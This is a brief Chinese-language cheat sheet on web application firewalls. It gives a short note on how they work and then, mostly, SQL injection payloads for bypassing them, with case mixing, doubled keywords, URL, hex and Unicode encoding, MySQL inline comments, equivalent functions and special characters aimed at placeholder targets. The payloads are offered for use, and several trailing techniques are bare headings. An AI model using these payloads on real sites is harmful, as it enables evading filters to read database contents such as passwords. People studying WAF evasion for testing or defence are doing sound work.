#### WAF是如何工作的
- 协议异常检测：拒绝不符合HTTP标准的请求
- 增强的输入验证：代理和服务器端验证，而不仅仅是客户端验证

#### 白名单和黑名单
- 基于规则和基于异常的保护：基于规则的更依赖黑名单机制，基于异常则更灵活
- 状态管理：关注会话保护还有：Cookie保护，反入侵规避技术，响应监控和信息披露保护

#### 如何绕过WAF
- 大小写
```
http://target.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4
```

- 关键字替换
```
http://target.com/index.php?page_id=-15&nbsp;UNIunionON SELselectECT 1,2,3,4
```

- 编码
+ URL encode
```
page.php?id=1%252f%252a*/UNION%252f%252a /SELECT
```
+ Hex encode
```
```
+ Hex encode
```
target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…
SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
```
+ Unicode encode
```
?id=10%D6‘%20AND%201=2%23SELECT 'Ä'='A'; #1
```

- 使用注释
```
index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　　　
 
　　　'union%a0select pass from users#

index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3
 
　　　?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…
```

- 等价函数
```
hex()、bin() ==> ascii()
sleep() ==>benchmark() 
concat_ws()==>group_concat()
substr((select 'password'),1,1) = 0x70
　strcmp(left('password',1), 0x69) = 1
　strcmp(left('password',1), 0x70) = 0
　strcmp(left('password',1), 0x71) = -1
mid()、substr() ==> substring()
@@user ==> user()
@@datadir ==> datadir()
```

- 使用特殊符号
```
+ ` symbol: select `version()`;
+ +- :select+id-1+1.from users;
+ @:select@^1.from users;
+Mysql function() as xxx
+`、~、!、@、%、()、[]、.、-、+ 、|、%00
```
- HTTP参数控制
- 缓冲区溢出
- 整合绕过
